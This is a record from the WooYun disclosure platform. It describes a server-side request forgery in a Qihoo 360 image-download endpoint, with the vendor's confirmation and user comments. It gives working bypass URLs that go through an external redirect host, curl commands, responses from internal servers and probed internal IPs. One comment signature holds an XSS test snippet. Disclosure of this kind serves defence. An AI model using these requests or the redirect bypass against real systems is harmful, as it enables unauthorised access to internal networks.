{"id": 65514, "wybug_id": "wooyun-2015-0135257", "wybug_title": "神器而已之奇虎360某SSRF绕过限制代理访问内网", "wybug_corp": "奇虎360", "wybug_author": "举起手来", "wybug_date": "2015-08-19 11:52", "wybug_open_date": "2015-10-03 12:04", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-03：\t细节向公众公开  简要描述： 神器面前。。 详细说明：  http://luyou.360.cn/activity/downLoadImg.php?url=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superplus/img/logo_white.png&filetype=jpg&filename=360ProductSpecificationp-p1这个逻辑是原创获取一个图片内容，然后再写入到另外一个文件。自然会想到是否可以访问内网，尝试以后发现做了两个限制：1.url必须是http或者https2.后缀必须是图片好，那么我们这么来绕过试试：http://luyou.360.cn/activity/downLoadImg.php?url=http://navsite.adsys.qihoo.net/?logo_white.png&filetype=jpg&filename=360ProductSpecificationp-p1依然不行，所以这些猜测本身是做了host的判断的，绕过host是对应内网则不请求百思之后，决定试试用跳转来试试，结果成功了http://luyou.360.cn/activity/downLoadImg.php?url=http://x1x2x3.duapp.com/l.php?url=http://10.121.95.65/?%2378348ee.jpg&filetype=jpg&filename=360ProductSpecificationp-p1\n➜  tmp  curl \"http://luyou.360.cn/activity/downLoadImg.php?url=http://x1x2x3.duapp.com/l.php?url=http://10.121.95.65/?%2378348ee.jpg&filetype=jpg&filename=360ProductSpecificationp-p1\"<html><head><title>Welcome to nginx!</title></head><body bgcolor=\"white\" text=\"black\"><center><h1>Welcome to nginx!</h1></center></body></html>\n   漏洞证明：  简单探测了一下：发现了一些ip的80是可用的：10.121.95.6510.121.95.16810.121.95.16010.121.95.222\n➜  tmp  curl \"http://luyou.360.cn/activity/downLoadImg.php?url=http://x1x2x3.duapp.com/l.php?url=http://navsite.adsys.qihoo.net/?%2378348ee.jpg&filetype=jpg&filename=360ProductSpecificationp-p1\"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>    body {        width: 35em;        margin: 0 auto;        font-family: Tahoma, Verdana, Arial, sans-serif;    }</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.</p><p>For online documentation and support please refer to<a href=\"http://nginx.org/\">nginx.org</a>.<br/>Commercial support is available at<a href=\"http://nginx.com/\">nginx.com</a>.</p><p><em>Thank you for using nginx.</em></p></body></html>\n   修复方案：  ~   版权声明：转载请注明来源 举起手来@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-19 12:02 厂商回复： 感谢您的反馈，相关业务已进行修复。后续更多问题可以反馈到360SRC（） 中秋发放福利即将到来～ 亲～  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-19 11:53 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1064 漏洞数:108        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  前排    \n     2015-08-19 11:57 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:567 漏洞数:108        | 低调求发展)\t\t \n  打脸。。    \n     2015-08-19 12:04 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:884 漏洞数:161        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  表哥威武。    \n     2015-08-19 12:16 |    \t\t举起手来 \t\t\t( 普通白帽子  |\t\t\t        Rank:496 漏洞数:53        | 准备好，举起手来！)\t\t \n  我是一个有情怀的人，厂商自重！~    \n     2015-08-19 12:16 |    \t\t举起手来 \t\t\t( 普通白帽子  |\t\t\t        Rank:496 漏洞数:53        | 准备好，举起手来！)\t\t \n  @_Thorns 感谢支持，要签名吗，朋友。    \n     2015-08-19 12:18 |    \t\tfuckadmin \t\t\t( 普通白帽子  |\t\t\t        Rank:476 漏洞数:72        | 千里之堤溃于蚁穴)\t\t \n  我是一个有情怀的人，厂商自重！~    \n     2015-08-19 13:55 |    \t\t苏安泽 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:25        | 敢不敢关注一下，<script>alert('关注成功'...)\t\t \n  洞主，这申请多少块包邮的啊？    \n     2015-08-20 00:52 |    \t\t抚琴听海 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 交流qq  752247101)\t\t \n  我一直在关注你  哈哈    \n     2015-08-20 02:18 |    \t\t苏安泽 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:25        | 敢不敢关注一下，<script>alert('关注成功'...)\t\t \n  洞主，这神器多少块全国包邮的。    \n     2015-08-22 18:25 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  @举起手来 有情怀……    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}